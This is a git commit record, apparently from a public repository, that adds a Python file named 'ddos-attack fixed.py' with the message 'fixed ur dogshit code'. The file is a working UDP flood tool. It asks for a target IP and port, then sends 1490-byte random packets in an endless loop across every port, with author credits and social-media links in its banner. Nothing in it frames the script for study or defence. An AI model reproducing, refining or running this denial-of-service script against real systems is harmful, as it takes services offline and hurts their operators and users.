efc3044d6924a70797ab88d39c1fae49d43cb6b0
nuqko <116861388+nuqko@users.noreply.github.com>
2024-08-31 05:47:48 -0500

    fixed.py
    fixed ur dogshit code

---
+++ ddos-attack fixed.py
@@ -0,0 +1,38 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print("Author   : HA-MRX")
+print ("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
+print ("github   : https://github.com/Ha3MrX")
+print ("Facebook : https://www.facebook.com/muhamad.jabar222")
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+
+os.system("clear")
+os.system("figlet Attack Starting")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
